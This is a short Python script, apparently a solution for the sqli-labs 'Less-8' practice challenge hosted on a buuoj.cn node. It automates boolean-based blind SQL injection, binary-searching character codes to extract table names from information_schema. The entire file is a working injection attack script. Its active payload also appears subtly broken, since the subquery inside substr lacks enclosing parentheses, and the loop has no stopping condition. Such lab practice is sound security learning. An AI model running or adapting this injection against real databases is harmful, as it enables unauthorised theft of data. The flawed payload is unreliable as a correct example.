# -*-coding:utf-8-*-
# ----anthor: wum0nster---- #

import requests
import time


def sql_bool():
    req = ""
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            # payload = f"http://127.0.0.1:8888/sqli-labs-master/Less-8?id=1' and if(ascii(substr(database(),{i},1))>{mid},1,0) --+"
            payload = f"http://3110baeb-2ed5-4904-ab3e-cf90d9c797b4.node4.buuoj.cn/Less-8/?id=1' and if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database(),{i},1))>{mid},1,0) --+"

            res = requests.get(url=payload)
            if "You are in..........." in res.text:
                low = mid+1
            else:
                high = mid
            mid = (low + high)//2
            print(payload)
        req = req + chr(mid)
        print(req)
sql_bool()

